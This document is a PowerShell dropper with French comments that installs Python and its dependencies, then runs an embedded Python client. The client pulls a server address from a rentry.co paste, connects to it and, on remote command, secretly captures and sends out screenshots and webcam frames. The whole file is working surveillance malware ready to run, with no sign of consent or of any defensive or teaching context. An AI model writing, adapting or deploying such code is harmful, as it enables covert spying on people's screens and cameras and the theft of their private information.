# Vérifier si Python est installé
if (!(Get-Command python -ErrorAction SilentlyContinue)) {
    # Vérifier si Chocolatey est installé
    if (!(Get-Command choco -ErrorAction SilentlyContinue)) {
        # Installer Chocolatey
        Set-ExecutionPolicy Bypass -Scope Process -Force;
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072;
        iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
    }

    # Installer Python avec Chocolatey
    choco install python -y
}

# Installer les bibliothèques requises
$requiredLibs = @("pyautogui", "pillow", "zstandard", "opencv-python", "urllib3")
$installedLibs = (python -m pip list) -join " "

foreach ($lib in $requiredLibs) {
    if (!($installedLibs.Contains($lib))) {
        python -m pip install $lib
    }
}

$pythonCode = @"
import socket
import pyautogui
from PIL import Image
import io
import zstandard as zstd
import cv2
import pickle
import http.cookiejar
import urllib.parse
import urllib.request
from json import loads as json_loads

_headers = {'Referer': 'https://rentry.co'}


class UrllibClient:

    def __init__(self):
        self.cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookie_jar))
        urllib.request.install_opener(self.opener)

    def get(self, url, headers={}):
        request = urllib.request.Request(url, headers=headers)
        return self._request(request)

    def post(self, url, data=None, headers={}):
        postdata = urllib.parse.urlencode(data).encode()
        request = urllib.request.Request(url, postdata, headers)
        return self._request(request)

    def _request(self, request):
        response = self.opener.open(request)
        response.status_code = response.getcode()
        response.data = response.read().decode('utf-8')
        return response


def raw(url):
    client = UrllibClient()
    return json_loads(client.get('https://rentry.co/api/raw/{}'.format(url)).data)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = raw('QZEOPJHOZgbuioebopmammazpodepfonzZEGnpazfoi71951uzebf55684651699985')['content']
port = 5844
client.connect((host, port))

def capture_screen():
    screen = pyautogui.screenshot()
    screen.thumbnail((1920, 1080), Image.Resampling.LANCZOS) # Increased dimensions
    with io.BytesIO() as output:
        screen.save(output, format='JPEG', quality=95) # Increased quality
        return output.getvalue()

def capture_webcam():
    try:
        ret, frame = cap.read()
        frame = cv2.resize(frame, (1280, 720)) # Increased dimensions
        return cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 95])[1].tobytes() # Increased quality
    except:
        print('Erreur lors de la capture de la webcam.')
        return b''

def send_image(image_data):
    compressed_data = zstd.ZstdCompressor(level=1).compress(image_data)
    pickled_data = pickle.dumps(compressed_data)
    client.sendall(pickled_data)

def receive():
    while True:
        try:
            message = client.recv(1024).decode()
            if message == 'CAPTURE_SCREEN':
                image_data = capture_screen()
                send_image(image_data)
            elif message == 'CAPTURE_WEBCAM':
                image_data = capture_webcam()
                send_image(image_data)
            elif message == 'KICK':
                print('Le serveur vous a éjecté.')
                client.close()
                break
        except:
            print('Erreur de connexion.')
            client.close()
            break

if __name__ == '__main__':
    cap = cv2.VideoCapture(0)
    try:
        receive()
    finally:
        cap.release()
        cv2.destroyAllWindows()
"@

if (Get-Command python3 -ErrorAction SilentlyContinue) {
    python3 -c $pythonCode
} else {
    python -c $pythonCode
}
